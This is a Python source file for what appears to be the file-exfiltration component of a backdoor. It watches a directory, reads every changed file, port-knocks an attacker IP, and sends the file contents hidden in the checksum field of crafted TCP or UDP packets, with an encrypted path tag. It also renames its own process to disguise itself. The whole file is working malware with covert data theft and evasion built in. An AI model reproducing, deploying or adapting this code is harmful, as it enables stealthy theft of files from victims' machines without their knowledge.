from os import PRIO_PGRP
from socket import timeout
from watchdog.observers import Observer
from watchdog.events import FileSystemEventHandler
import scapy.all as scapy
from cryptography.fernet import Fernet
import time
import configBackdoor
import ipaddress
import sys
import setproctitle

dest = configBackdoor.attackerIP

def validate_ip_address(address):
    ip = 'inputted'
    try:
        ip = ipaddress.ip_address(address)
        return True
    except ValueError:
        print(f"IP address {ip} is not valid".format(address))


def load_key():
    return open("key.key", "rb").read()

def knock():
    if configBackdoor.protocol == 'TCP':
        for i in range(0, len(configBackdoor.knock_port)):
            pkt = scapy.IP(dst=dest)/scapy.TCP(dport=configBackdoor.knock_port[i], flags="S", chksum=configBackdoor.flag)
            time.sleep(0.1)
            scapy.send(pkt, verbose=0)
    else:
        for i in range(0, len(configBackdoor.knock_port)):
            pkt = scapy.IP(dst=configBackdoor.attackerIP)/scapy.UDP(chksum=(configBackdoor.flag), dport=configBackdoor.knock_port[i])
            time.sleep(0.1)
            scapy.send(pkt, verbose=0)    

class MyHandler(FileSystemEventHandler):            

    def on_any_event(self, event):
        if event.src_path == '.':
            return

        try:
            with open(event.src_path, 'r') as f:
                data = f.read()
                f.close()
        
            if "b'" in str(data):
                data = '@@@' + data.decode('utf-8') + '***'
            else:
                data = '@@@' + str(data) + '***'

            path = '###' + event.src_path.replace('./', '') + '&&&'

            password = configBackdoor.password + path
            password = cipher_suite.encrypt(password.encode('utf-8'))

            if configBackdoor.protocol == 'TCP':
                knock()
                time.sleep(1)
                password = b'$$$' + password
                pkt = scapy.IP(dst=dest)/scapy.TCP(chksum=(scapy.RawVal(data)), sport=configBackdoor.flag, dport=configBackdoor.filePort)/password
            else:
                knock()
                time.sleep(1)    
                pkt = scapy.IP(dst=configBackdoor.attackerIP)/scapy.UDP(chksum=(scapy.RawVal(data)), sport=configBackdoor.flag, dport=configBackdoor.filePort)/password

            time.sleep(0.1)
            scapy.send(pkt, verbose=0)
        except IsADirectoryError as e:
            pass
        except FileNotFoundError as e:
            pass

def fileMonitor():
    if not validate_ip_address(dest):
        sys.exit()
        
    try:
        event_handler = MyHandler()
        observer = Observer()
        observer.schedule(event_handler, path='.', recursive=False)
        observer.start()

        while True:
            try:
                pass
            except KeyboardInterrupt:
                observer.stop()
    except FileNotFoundError:
        pass

if __name__ == "__main__":
    processName = configBackdoor.processName2
    setproctitle.setproctitle(processName)
    key = load_key()

    cipher_suite = Fernet(key)

    fileMonitor()